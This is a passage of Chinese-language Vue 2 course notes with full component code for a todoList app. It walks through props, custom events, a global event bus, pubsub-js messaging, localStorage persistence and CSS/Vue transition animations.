<!-- 组件样式 -->
<style>
.app {
  background-color: gray;
}
</style>
```

MySchool.vue
```
<style>
  .school {
    background-color: skyblue;
  }
</style>

<script>
export default {
  name: "MySchool",
  
  data() {
    return {
      name: '尚硅谷',
      address: '北京'
    }
  },
  methods: {
    sendSchoolName() {
      this.getSchoolName(this.name)
    }
  },
  props: ['getSchoolName']
};
</script>

<template>
  <div class="school">
    <h1>{{ name }}</h1>
    <h1>{{ address }}</h1>
    <button @click="sendSchoolName">把school组件中姓名给App组件</button>
  </div>
</template>
```

MyStudent.vue
```
<style>
.student {
  background-color: red;
}
</style>

<script>
export default {
  name: "MyStudent",
  data() {
    return {
      name: "mike",
      age: 20,
    };
  },
};
</script>

<template>
  <div class="student">
    <h1>{{ name }}</h1>
    <h1>{{ age }}</h1>
  </div>
</template>
```

实例

todoList实现

文件结构

![image](20E4EF56F0454A15842897A02C188792)

main.js

```
//引入Vue
import Vue from "vue";
//引入App
import App from './App';

//关闭Vue的生产提示
Vue.config.productionTip = false;


new Vue({
    el:'#app',
    render: h => h(App)
});
```

App.vue
```
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHeader @addTodo="addTodo"/>
        <List
            :todos="todos"
            :checkTodo="checkTodo"
            :deleteTodo="deleteTodo"
        />
        <MyFooter
            :todos="todos"
            @checkAllTodo="checkAllTodo"
            @clearAllDoneTodo="clearAllDoneTodo"
        />
      </div>
    </div>
  </div>
</template>

<script>
import MyHeader from "@/components/MyHeader";
import List from "@/components/List";
import MyFooter from '@/components/MyFooter';
export default {
  name: "App",
  components:{
    List,
    MyFooter,
    MyHeader
  },
  data() {
    return {
      
      todos:JSON.parse(localStorage.getItem('todos')) || []
    }
  },
  methods:{
    //添加的todo
    addTodo(todo){
      console.log('我是app组件，我收到了数据');
      this.todos.unshift(todo);
    },
    checkTodo(id){
      const todo = this.todos.find(todo => todo.id === id);
      todo.done = !todo.done;
    },
    deleteTodo(id){
      this.todos = this.todos.filter(todo => todo.id !== id);
    },
    checkAllTodo(done){
      this.todos.forEach(todo => todo.done = done);
    },
    clearAllDoneTodo(){
      this.todos = this.todos.filter(todo => !todo.done)
    }
  },
  watch:{
    //深度监视
    todos:{
      deep: true, //深度监视当我监视数组中的对象的某个属性的变化它也会产生反应
      handler(newValue) {
        //本地存储存的是key和value都是字符串
        //数据存放在本地存储中
        localStorage.setItem("todos", JSON.stringify(newValue))
      }
    },
  }
}
</script>

<style>
/*base*/
body {
  background: #fff;
}

.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
  border-radius: 4px;
}

.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}

.btn-danger:hover {
  color: #fff;
  background-color: #bd362f;
}

.btn:focus {
  outline: none;
}

.todo-container {
  width: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}

</style>
```

Item.vue
```
<template>
  <li>
    <label>
<!--      这里勾选和取消勾选可以使用change和click作为事件处理-->
      <input type="checkbox" :checked="todo.done" @change="handleCheck(todo.id)"/>
      <!--v-model数据的双向绑定，checkbox使用v-model来双向绑定其是否被勾选,也可以实现效果但不推荐(因为其实修改了props中的数据)-->
      <!--这里修改了从List修改过来的props,这里的不允许改是浅层次，就是如果props是一个对象则这个修改这个对象的某一个属性vue是放行的-->
      <!-- <input type="checkbox" v-model="todo.done"/>-->
      <span>{{  todo.title }}</span>
    </label>
    <button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
  </li>
</template>

<script>
export default {
  name: "Item",
  //声明接收todo
  props: ['todo', 'checkTodo', 'deleteTodo'],
  methods:{
    handleCheck(id){
      this.checkTodo(id);
    },
    handleDelete(id){
      if(confirm(`确定删除编号为${id}的todo吗`)){
        // console.log(id);
        this.deleteTodo(id);
      }
    }
  }
}
</script>

<style scoped>
/*item*/
li {
  list-style: none;
  height: 36px;
  line-height: 36px;
  padding: 0 5px;
  border-bottom: 1px solid #ddd;
}

li label {
  float: left;
  cursor: pointer;
}

li label li input {
  vertical-align: middle;
  margin-right: 6px;
  position: relative;
  top: -1px;
}

li button {
  float: right;
  display: none;
  margin-top: 3px;
}

li:before {
  content: initial;
}

li:last-child {
  border-bottom: none;
}

li:hover{
  background: #ddd;
}

li:hover button{
  display: block;
}
</style>
```

List.vue
```
<template>
  <ul class="todo-main">
    <Item
        v-for="todoObj in todos"
        :key="todoObj.id"
        :todo="todoObj"
        :checkTodo="checkTodo"
        :deleteTodo="deleteTodo"
    />
  </ul>
</template>

<script>
import Item from "@/components/Item";

export default {
  name: "List",
  components: {
    Item,
  },
  props:['todos', 'checkTodo', 'deleteTodo']
}
</script>

<style scoped>
/*main*/
.todo-main {
  margin-left: 0;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding: 0px;
}

.todo-empty {
  height: 40px;
  line-height: 40px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding-left: 5px;
  margin-top: 10px;
}
</style>
```

MyFooter.vue
```
<template>
  <!--隐式类型转换-->
  <div class="todo-footer" v-show="total">
    <label>
      <!--这里也可用v-model来替代，此时不需要计算属性了-->
<!--      <input type="checkbox" :checked="isAll" @change="checkAll"/>-->
      <input type="checkbox" v-model="isAll"/>
    </label>
    <span>
       <span>已完成{{ doneTotal }}</span> / 全部{{total}}
    </span>
    <button class="btn btn-danger" @click="clearAll">清除已完成任务</button>
  </div>
</template>
<script>
export default {
  name: "MyFooter",
  props: ['todos'],
  computed:{
    total(){
      return this.todos.length;
    },
    doneTotal(){
      return this.todos.reduce((todoTotal, todo) => {
        //隐士类型转换
        return todoTotal + todo.done;
      }, 0);
      // return this.todos.filter(todo => todo.done).length;
    },
    isAll:{
      get(){
        return this.total === this.doneTotal && this.doneTotal > 0; //计算属性可以通过其他的计算属性接着进行计算得到结果
      },
      set(value){
        //value注意要么为true，要么为false，因为你是把它应用在了checkbox上
        //this.checkAllTodo(value);
        //采用自定义事件来修改
        this.$emit('checkAllTodo', value);
      }
    }
  },
  methods:{
    // checkAll(e){
    //   // console.log(e.target.checked); //判断这个checkbox到底是不是全选 true全选 false全不选
    //   this.checkAllTodo(e.target.checked);
    // }
    clearAll(){
       // this.clearAllDoneTodo();
      //修改为自定义事件
      this.$emit('clearAllDoneTodo');
    }
  }
}
</script>

<style scoped>
/*footer*/
.todo-footer {
  height: 40px;
  line-height: 40px;
  padding-left: 6px;
  margin-top: 5px;
}

.todo-footer label {
  display: inline-block;
  margin-right: 20px;
  cursor: pointer;
}

.todo-footer label input {
  position: relative;
  top: -1px;
  vertical-align: middle;
  margin-right: 5px;
}

.todo-footer button {
  float: right;
  margin-top: 5px;
}
</style>
```

MyHeader.vue
```
<template>
  <div class="todo-header">
    <input type="text" placeholder="请输入你的任务名称，按回车键确认" v-model="title" @keyup.enter="add"/>
  </div>
</template>

<script>
import { nanoid } from 'nanoid';
export default {
  //注意不管是你写的data也还还是methods也好，甚至是computed计算属性也好都会出现在组件事例对象vc身上
  //属性值不能重名
  name: "MyHeader",
  data(){
    return {
      title: ''
    }
  },
  methods:{
    add(){
      //将用户的输入包装成一个todo对象
      console.log(this.title)
      if(!this.title.trim()) {
        alert('代办事项不能为空')
        return; //输入的代办事项为空则不走下面流程
      }
      const todoObj = {
        id: nanoid(),
        title: this.title,
        done:false
      }
      // console.log(todoObj);
      // this.addTodo(todoObj);
      //采用自定义事件来修改
      this.$emit('addTodo',todoObj);
      this.title = '';
    }
  },
}
</script>

<style scoped>
/*header*/
.todo-header input {
  width: 560px;
  height: 28px;
  font-size: 14px;
  border: 1px solid #ccc;
  border-radius: 4px;
  padding: 4px 7px;
}

.todo-header input:focus {
  outline: none;
  border-color: rgba(82, 168, 236, 0.8);
  box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
}
</style>
```

---

### 总结

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=83

---

### 全局事件总线

实现任意2个组件之间通信。

文件结构

![image](F17592154ACC4D1FB92DDCA74BB124EF)

main.js

```
//引入Vue
import Vue from "vue";
//引入App
import App from './App';

//关闭Vue的生产提示
Vue.config.productionTip = false;


//创建一个vc
// const Demo = Vue.extend({}); //demo 傀儡不需要配置对象
//
// const d = new Demo(); //此时这个d就是组件实例对象 => vc

// Vue.prototype.x = d;

new Vue({
    el:'#app',
    render: h => h(App),
    beforeCreate() {
        //此时这个this就是vm，只不过这个时候还并没有去解析模版
        Vue.prototype.$bus = this; //安装全局事件总线
    }
});
```

App.vue
```
<template>
   <div class="app">
      <h1>{{ msg }}</h1>
      <School/>
      <Student/>
   </div>
</template>

<script>
import Student from "@/components/Student";
import School from "@/components/School";
export default {
  name: "App",
  components: {
    School,
    Student,
  },
  data() {
    return {
      msg: 'helloこんにちは',
      studentName: ''
    }
  }
}
</script>

<style>
   /*
   全局的样式是不需要加scoped
   全局共享
   */
   .app{
     background: gray;
     padding: 5px;
   }
</style>
```

School.vue
```
<template>
   <div class="demo">
     <h2>学校名称:{{  name }}</h2>
     <h2>学校地址: {{ address }}</h2>
   </div>
</template>

<script>
export default {
  name: "School",
  data(){
    console.log(this);
    return {
       name: 'wust university',
       address: '武汉科技大学'
    }
  },
  mounted() {
    console.log('School', this);
    this.$bus.$on('hello', (data) => {
      console.log(`我是School组件,我收到了数据,${data}`);
    })
  },
  beforeDestroy() {
    this.$bus.$off('hello'); //销毁解绑
  }
}
</script>

<style scoped>
   /*scoped代表局部的*/
  .demo{
    background: skyblue;
    padding:5px
  }
</style>
```

Student.vue
```
<template>
   <div class="student">
     <h2>姓名:{{  name }}</h2>
     <h2>性别: {{ sex }}</h2>
     <button @click="sendStudentName">把学生名传递给school组件</button>
   </div>
</template>

<script>

export default {
  name: "Student",
  data(){
    console.log(this);
    return {
       name: '张三',
       sex: '男',
    }
  },
  methods:{
    sendStudentName(){
      this.$bus.$emit('hello', this.name);
    }
  },
  mounted() {
    // console.log(this.x); //vc.__proto__ === VueComponent.protoType VueComponent.protoType.__proto__ === Vue.prototype(完事了)
  }
}
</script>

<style scoped>
  .student{
    background: orange;
    padding: 5px;
    margin-bottom: 10px;
  }
</style>
```

---

### todoList全局事件总线

文件结构

```
//引入Vue
import Vue from "vue";
//引入App
import App from './App';

//关闭Vue的生产提示
Vue.config.productionTip = false;


new Vue({
    el: '#app',
    render: h => h(App),
    beforeCreate() {
        //事件总线
       Vue.prototype.$bus = this;
    }
});
```

App.vue
```
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHeader @addTodo="addTodo"/>
        <List
            :todos="todos"
        />
        <MyFooter
            :todos="todos"
            @checkAllTodo="checkAllTodo"
            @clearAllDoneTodo="clearAllDoneTodo"
        />
      </div>
    </div>
  </div>
</template>

<script>
import MyHeader from "@/components/MyHeader";
import List from "@/components/List";
import MyFooter from '@/components/MyFooter';
export default {
  name: "App",
  components:{
    List,
    MyFooter,
    MyHeader
  },
  data() {
    return {
      todos:JSON.parse(localStorage.getItem('todos')) || []
    }
  },
  methods:{
    //添加的todo
    addTodo(todo){
      console.log('我是app组件，我收到了数据');
      this.todos.unshift(todo);
    },
    checkTodo(id){
      const todo = this.todos.find(todo => todo.id === id);
      todo.done = !todo.done;
    },
    deleteTodo(id){
      this.todos = this.todos.filter(todo => todo.id !== id);
    },
    checkAllTodo(done){
      this.todos.forEach(todo => todo.done = done);
    },
    clearAllDoneTodo(){
      this.todos = this.todos.filter(todo => !todo.done)
    }
  },
  watch:{
    //深度监视
    todos:{
      deep: true, //深度监视当我监视数组中的对象的某个属性的变化它也会产生反应
      handler(newValue) {
        //本地存储存的是key和value都是字符串
        //数据存放在本地存储中
        localStorage.setItem("todos", JSON.stringify(newValue))
      }
    },
  },
  //已挂在绑定事件总线
  mounted() {
    this.$bus.$on('checkTodo', this.checkTodo);
    this.$bus.$on('deleteTodo', this.deleteTodo);
  },
  //被卸载注意解绑
  beforeMount() {
    this.$bus.$off('checkTodo');
    this.$bus.$off('deleteTodo');
  }
}
</script>

<style>
/*base*/
body {
  background: #fff;
}

.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
  border-radius: 4px;
}

.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}

.btn-danger:hover {
  color: #fff;
  background-color: #bd362f;
}

.btn:focus {
  outline: none;
}

.todo-container {
  width: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}

</style>
```

Item.vue
```
<template>
  <li>
    <label>
      <!--这里勾选和取消勾选可以使用change和click作为事件处理-->
      <input type="checkbox" :checked="todo.done" @change="handleCheck(todo.id)"/>
      <!--v-model数据的双向绑定，checkbox使用v-model来双向绑定其是否被勾选,也可以实现效果但不推荐(因为其实修改了props中的数据)-->
      <!--这里修改了从List修改过来的props,这里的不允许改是浅层次，就是如果props是一个对象则这个修改这个对象的某一个属性vue是放行的-->
      <!-- <input type="checkbox" v-model="todo.done"/>-->
      <span>{{  todo.title }}</span>
    </label>
    <button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
  </li>
</template>

<script>
export default {
  name: "Item",
  //声明接收todo
  props: ['todo'],
  methods:{
    handleCheck(id){
      //事件总线
      this.$bus.$emit('checkTodo',id);
    },
    handleDelete(id){
      if(confirm(`确定删除编号为${id}的todo吗`)){
        // console.log(id);
        //事件总线
        this.$bus.$emit('deleteTodo',id);
      }
    }
  }
}
</script>

<style scoped>
/*item*/
li {
  list-style: none;
  height: 36px;
  line-height: 36px;
  padding: 0 5px;
  border-bottom: 1px solid #ddd;
}

li label {
  float: left;
  cursor: pointer;
}

li label li input {
  vertical-align: middle;
  margin-right: 6px;
  position: relative;
  top: -1px;
}

li button {
  float: right;
  display: none;
  margin-top: 3px;
}

li:before {
  content: initial;
}

li:last-child {
  border-bottom: none;
}

li:hover{
  background: #ddd;
}

li:hover button{
  display: block;
}
</style>
```

List.vue
```
<template>
  <ul class="todo-main">
    <Item
        v-for="todoObj in todos"
        :key="todoObj.id"
        :todo="todoObj"
    />
  </ul>
</template>

<script>
import Item from "@/components/Item";

export default {
  name: "List",
  components: {
    Item,
  },
  props:['todos']
}
</script>

<style scoped>
/*main*/
.todo-main {
  margin-left: 0;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding: 0px;
}

.todo-empty {
  height: 40px;
  line-height: 40px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding-left: 5px;
  margin-top: 10px;
}
</style>
```

MyFooter.vue
```
<template>
  <!--隐式类型转换-->
  <div class="todo-footer" v-show="total">
    <label>
      <!--这里也可用v-model来替代，此时不需要计算属性了-->
<!--      <input type="checkbox" :checked="isAll" @change="checkAll"/>-->
      <input type="checkbox" v-model="isAll"/>
    </label>
    <span>
       <span>已完成{{ doneTotal }}</span> / 全部{{total}}
    </span>
    <button class="btn btn-danger" @click="clearAll">清除已完成任务</button>
  </div>
</template>
<script>
export default {
  name: "MyFooter",
  props: ['todos'],
  computed:{
    total(){
      return this.todos.length;
    },
    doneTotal(){
      return this.todos.reduce((todoTotal, todo) => {
        //隐士类型转换
        return todoTotal + todo.done;
      }, 0);
      // return this.todos.filter(todo => todo.done).length;
    },
    isAll:{
      get(){
        return this.total === this.doneTotal && this.doneTotal > 0; //计算属性可以通过其他的计算属性接着进行计算得到结果
      },
      set(value){
        //value注意要么为true，要么为false，因为你是把它应用在了checkbox上
        //this.checkAllTodo(value);
        //采用自定义事件来修改
        this.$emit('checkAllTodo', value);
      }
    }
  },
  methods:{
    // checkAll(e){
    //   // console.log(e.target.checked); //判断这个checkbox到底是不是全选 true全选 false全不选
    //   this.checkAllTodo(e.target.checked);
    // }
    clearAll(){
       // this.clearAllDoneTodo();
      //修改为自定义事件
      this.$emit('clearAllDoneTodo');
    }
  }
}
</script>

<style scoped>
/*footer*/
.todo-footer {
  height: 40px;
  line-height: 40px;
  padding-left: 6px;
  margin-top: 5px;
}

.todo-footer label {
  display: inline-block;
  margin-right: 20px;
  cursor: pointer;
}

.todo-footer label input {
  position: relative;
  top: -1px;
  vertical-align: middle;
  margin-right: 5px;
}

.todo-footer button {
  float: right;
  margin-top: 5px;
}
</style>
```

MyHeader.vue
```
<template>
  <div class="todo-header">
    <input type="text" placeholder="请输入你的任务名称，按回车键确认" v-model="title" @keyup.enter="add"/>
  </div>
</template>

<script>
import { nanoid } from 'nanoid';
export default {
  //注意不管是你写的data也还还是methods也好，甚至是computed计算属性也好都会出现在组件事例对象vc身上
  //属性值不能重名
  name: "MyHeader",
  data(){
    return {
      title: ''
    }
  },
  methods:{
    add(){
      //将用户的输入包装成一个todo对象
      console.log(this.title)
      if(!this.title.trim()) {
        alert('代办事项不能为空')
        return; //输入的代办事项为空则不走下面流程
      }
      const todoObj = {
        id: nanoid(),
        title: this.title,
        done:false
      }
      // console.log(todoObj);
      // this.addTodo(todoObj);
      //采用自定义事件来修改
      this.$emit('addTodo',todoObj);
      this.title = '';
    }
  },
}
</script>

<style scoped>
/*header*/
.todo-header input {
  width: 560px;
  height: 28px;
  font-size: 14px;
  border: 1px solid #ccc;
  border-radius: 4px;
  padding: 4px 7px;
}

.todo-header input:focus {
  outline: none;
  border-color: rgba(82, 168, 236, 0.8);
  box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
}
</style>
```




---

### 订阅发布

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=87

---

### todoList-订阅发布

文件结构

![image](C1D68B654B0542488152AF6165582271)

main.js

```
//引入Vue
import Vue from "vue";
//引入App
import App from './App';

//关闭Vue的生产提示
Vue.config.productionTip = false;

new Vue({
    el:'#app',
    render: h => h(App),
});
```

App.vue
```
<template>
   <div class="app">
      <h1>{{ msg }}</h1>
      <School/>
      <Student/>
   </div>
</template>

<script>
import Student from "@/components/Student";
import School from "@/components/School";
export default {
  name: "App",
  components: {
    School,
    Student,
  },
  data() {
    return {
      msg: 'helloこんにちは',
      studentName: ''
    }
  }
}
</script>

<style>
   /*
   全局的样式是不需要加scoped
   全局共享
   */
   .app{
     background: gray;
     padding: 5px;
   }
</style>
```

School.vue
```
<template>
   <div class="demo">
     <h2>学校名称:{{  name }}</h2>
     <h2>学校地址: {{ address }}</h2>
   </div>
</template>

<script>
import pubsub from 'pubsub-js';
export default {
  name: "School",
  data(){
    console.log(this);
    return {
       name: 'wust university',
       address: '武汉科技大学'
    }
  },
  mounted() {
    // console.log('School', this);
    // this.$bus.$on('hello', (data) => {
    //   console.log(`我是School组件,我收到了数据,${data}`);
    // })
    //订阅消息 隔空对讲机喊话
    this.pubId = pubsub.subscribe('hello',  (name, msg) => {
      //注意这里写剪头函数this才不会丢
      console.log(`有人发布了hello消息，回调被执行,data: ${msg}`);

    });
  },
  beforeDestroy() {
    // this.$bus.$off('hello'); //销毁解绑
    //取消订阅
    pubsub.unsubscribe(this.pubId); //取消订阅
  }
}
</script>

<style scoped>
   /*scoped代表局部的*/
  .demo{
    background: skyblue;
    padding:5px
  }
</style>
```

Student.vue
```
<template>
   <div class="student">
     <h2>姓名:{{  name }}</h2>
     <h2>性别: {{ sex }}</h2>
     <button @click="sendStudentName">把学生名传递给school组件</button>
   </div>
</template>

<script>
import pubsub from "pubsub-js";
export default {
  name: "Student",
  data(){
    console.log(this);
    return {
       name: '张三',
       sex: '男',
    }
  },
  methods:{
    sendStudentName(){
      // this.$bus.$emit('hello', this.name);
      //发布消息
      pubsub.publish('hello', this.name);
    }
  },
}
</script>

<style scoped>
  .student{
    background: orange;
    padding: 5px;
    margin-bottom: 10px;
  }
</style>
```

---

### 消息订阅实现todoList

文件结构

![image](7B8E9098CB564317A8A2875F55B421AB)

main.js

```
//引入Vue
import Vue from "vue";
//引入App
import App from './App';

//关闭Vue的生产提示
Vue.config.productionTip = false;


new Vue({
    el: '#app',
    render: h => h(App),
    beforeCreate() {
        //事件总线
       Vue.prototype.$bus = this;
    }
});
```

App.vue
```
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHeader @addTodo="addTodo"/>
        <List
            :todos="todos"
        />
        <MyFooter
            :todos="todos"
            @checkAllTodo="checkAllTodo"
            @clearAllDoneTodo="clearAllDoneTodo"
        />
      </div>
    </div>
  </div>
</template>

<script>
import MyHeader from "@/components/MyHeader";
import List from "@/components/List";
import MyFooter from '@/components/MyFooter';
import pubsub from "pubsub-js";
export default {
  name: "App",
  components:{
    List,
    MyFooter,
    MyHeader
  },
  data() {
    return {
      
      todos:JSON.parse(localStorage.getItem('todos')) || []
    }
  },
  methods:{
    //添加的todo
    addTodo(todo){
      console.log('我是app组件，我收到了数据');
      this.todos.unshift(todo);
    },
    checkTodo(id){
      const todo = this.todos.find(todo => todo.id === id);
      todo.done = !todo.done;
    },
    deleteTodo(_, id){
      this.todos = this.todos.filter(todo => todo.id !== id);
    },
    checkAllTodo(done){
      this.todos.forEach(todo => todo.done = done);
    },
    clearAllDoneTodo(){
      this.todos = this.todos.filter(todo => !todo.done)
    }
  },
  watch:{
    //深度监视
    todos:{
      deep: true, //深度监视当我监视数组中的对象的某个属性的变化它也会产生反应
      handler(newValue) {
        //本地存储存的是key和value都是字符串
        //数据存放在本地存储中
        localStorage.setItem("todos", JSON.stringify(newValue))
      }
    },
  },
  //已挂在绑定事件总线
  mounted() {
    this.$bus.$on('checkTodo', this.checkTodo);
    this.pubId = pubsub.subscribe('deleteTodo', this.deleteTodo);
  },
  //被卸载注意解绑
  beforeMount() {
    this.$bus.$off('checkTodo');
    pubsub.unsubscribe(this.pubId); //取消订阅的方式与取消定时器的方式是类似的，记住
  }
}
</script>

<style>
/*base*/
body {
  background: #fff;
}

.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
  border-radius: 4px;
}

.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}

.btn-danger:hover {
  color: #fff;
  background-color: #bd362f;
}

.btn:focus {
  outline: none;
}

.todo-container {
  width: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}

</style>
```

Item.vue
```
<template>
  <li>
    <label>
      <!--这里勾选和取消勾选可以使用change和click作为事件处理-->
      <input type="checkbox" :checked="todo.done" @change="handleCheck(todo.id)"/>
      <!--v-model数据的双向绑定，checkbox使用v-model来双向绑定其是否被勾选,也可以实现效果但不推荐(因为其实修改了props中的数据)-->
      <!--这里修改了从List修改过来的props,这里的不允许改是浅层次，就是如果props是一个对象则这个修改这个对象的某一个属性vue是放行的-->
      <!-- <input type="checkbox" v-model="todo.done"/>-->
      <span>{{  todo.title }}</span>
    </label>
    <button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
  </li>
</template>

<script>
import pubsub from "pubsub-js";
export default {
  name: "Item",
  //声明接收todo
  props: ['todo'],
  methods:{
    handleCheck(id){
      //事件总线
      this.$bus.$emit('checkTodo',id);
    },
    handleDelete(id){
      if(confirm(`确定删除编号为${id}的todo吗`)){
        // console.log(id);
        //事件总线
        // this.$bus.$emit('deleteTodo',id);
        //消息订阅改写
        pubsub.publish('deleteTodo', id);
      }
    }
  }
}
</script>

<style scoped>
/*item*/
li {
  list-style: none;
  height: 36px;
  line-height: 36px;
  padding: 0 5px;
  border-bottom: 1px solid #ddd;
}

li label {
  float: left;
  cursor: pointer;
}

li label li input {
  vertical-align: middle;
  margin-right: 6px;
  position: relative;
  top: -1px;
}

li button {
  float: right;
  display: none;
  margin-top: 3px;
}

li:before {
  content: initial;
}

li:last-child {
  border-bottom: none;
}

li:hover{
  background: #ddd;
}

li:hover button{
  display: block;
}
</style>
```

List.vue
```
<template>
  <ul class="todo-main">
    <Item
        v-for="todoObj in todos"
        :key="todoObj.id"
        :todo="todoObj"
    />
  </ul>
</template>

<script>
import Item from "@/components/Item";

export default {
  name: "List",
  components: {
    Item,
  },
  props:['todos']
}
</script>

<style scoped>
/*main*/
.todo-main {
  margin-left: 0;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding: 0px;
}

.todo-empty {
  height: 40px;
  line-height: 40px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding-left: 5px;
  margin-top: 10px;
}
</style>
```

MyFooter.vue
```
<template>
  <!--隐式类型转换-->
  <div class="todo-footer" v-show="total">
    <label>
      <!--这里也可用v-model来替代，此时不需要计算属性了-->
<!--      <input type="checkbox" :checked="isAll" @change="checkAll"/>-->
      <input type="checkbox" v-model="isAll"/>
    </label>
    <span>
       <span>已完成{{ doneTotal }}</span> / 全部{{total}}
    </span>
    <button class="btn btn-danger" @click="clearAll">清除已完成任务</button>
  </div>
</template>
<script>
export default {
  name: "MyFooter",
  props: ['todos'],
  computed:{
    total(){
      return this.todos.length;
    },
    doneTotal(){
      return this.todos.reduce((todoTotal, todo) => {
        //隐士类型转换
        return todoTotal + todo.done;
      }, 0);
      // return this.todos.filter(todo => todo.done).length;
    },
    isAll:{
      get(){
        return this.total === this.doneTotal && this.doneTotal > 0; //计算属性可以通过其他的计算属性接着进行计算得到结果
      },
      set(value){
        //value注意要么为true，要么为false，因为你是把它应用在了checkbox上
        //this.checkAllTodo(value);
        //采用自定义事件来修改
        this.$emit('checkAllTodo', value);
      }
    }
  },
  methods:{
    // checkAll(e){
    //   // console.log(e.target.checked); //判断这个checkbox到底是不是全选 true全选 false全不选
    //   this.checkAllTodo(e.target.checked);
    // }
    clearAll(){
       // this.clearAllDoneTodo();
      //修改为自定义事件
      this.$emit('clearAllDoneTodo');
    }
  }
}
</script>

<style scoped>
/*footer*/
.todo-footer {
  height: 40px;
  line-height: 40px;
  padding-left: 6px;
  margin-top: 5px;
}

.todo-footer label {
  display: inline-block;
  margin-right: 20px;
  cursor: pointer;
}

.todo-footer label input {
  position: relative;
  top: -1px;
  vertical-align: middle;
  margin-right: 5px;
}

.todo-footer button {
  float: right;
  margin-top: 5px;
}
</style>
```

MyHeader.vue
```
<template>
  <div class="todo-header">
    <input type="text" placeholder="请输入你的任务名称，按回车键确认" v-model="title" @keyup.enter="add"/>
  </div>
</template>

<script>
import { nanoid } from 'nanoid';
export default {
  //注意不管是你写的data也还还是methods也好，甚至是computed计算属性也好都会出现在组件事例对象vc身上
  //属性值不能重名
  name: "MyHeader",
  data(){
    return {
      title: ''
    }
  },
  methods:{
    add(){
      //将用户的输入包装成一个todo对象
      console.log(this.title)
      if(!this.title.trim()) {
        alert('代办事项不能为空')
        return; //输入的代办事项为空则不走下面流程
      }
      const todoObj = {
        id: nanoid(),
        title: this.title,
        done:false
      }
      // console.log(todoObj);
      // this.addTodo(todoObj);
      //采用自定义事件来修改
      this.$emit('addTodo',todoObj);
      this.title = '';
    }
  },
}
</script>

<style scoped>
/*header*/
.todo-header input {
  width: 560px;
  height: 28px;
  font-size: 14px;
  border: 1px solid #ccc;
  border-radius: 4px;
  padding: 4px 7px;
}

.todo-header input:focus {
  outline: none;
  border-color: rgba(82, 168, 236, 0.8);
  box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
}
</style>
```

---

### $nextTick

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=90

---

### 过渡动画

CSS写法

```
<template>
  <div>
    <button @click="isShow = !isShow">隐藏/显示</button>
    <h1 v-show="isShow" class="come">hello</h1>
  </div>
</template>

<script>
export default {
  name: "myTest",
  data() {
    return {
      isShow: true,
    };
  },
};
</script>

<style>
h1 {
  background-color: orange;
  width: 200px;
}
.come {
  animation: move 1s;
}
.leave {
  animation: leave 1s;
}
@keyframes move {
  from {
    transform: translateX(-300px);
  }
  to {
    transform: translateX(0px);
  }
}

@keyframes leave {
  from {
    transform: translateX(0px);
  }
  to {
    transform: translateX(-300px);
  }
}
</style>
```

Vue写法

```
<template>
  <div>
    <button @click="isShow = !isShow">隐藏/显示</button>
    <transition>
      <h1 v-show="isShow">hello</h1>
    </transition>
  </div>
</template>

<script>
export default {
  name: "myTest",
  data() {
    return {
      isShow: true,
    };
  },
};
</script>

<style>
h1 {
  background-color: orange;
  width: 200px;
}
.v-enter-active {
  animation: move 1s;
}
.v-leave-active {
  animation: leave 1s;
}
@keyframes move {
  from {
    transform: translateX(-300px);
  }
  to {
    transform: translateX(0px);
  }
}

@keyframes leave {
  from {
    transform: translateX(0px);
  }
  to {
    transform: translateX(-300px);
  }
}
</style>
```

另一种写法
```
<template>
  <div>
    <button @click="isShow = !isShow">隐藏/显示</button>
    <transition name="animation">
      <h1 v-show="isShow">hello</h1>
    </transition>
  </div>
</template>

<script>
export default {
  name: "myTest",
  data() {
    return {
      isShow: true,
    };
  },
};
</script>

<style>
h1 {
  background-color: orange;
  width: 200px;
}
.animation-enter-active {
  animation: move 1s;
}
.animation-leave-active {
  animation: leave 1s;
}
@keyframes move {
  from {
    transform: translateX(-300px);
  }
  to {
    transform: translateX(0px);
  }
}

@keyframes leave {
  from {
    transform: translateX(0px);
  }
  to {
    transform: translateX(-300px);
  }
}
</style>
```

```
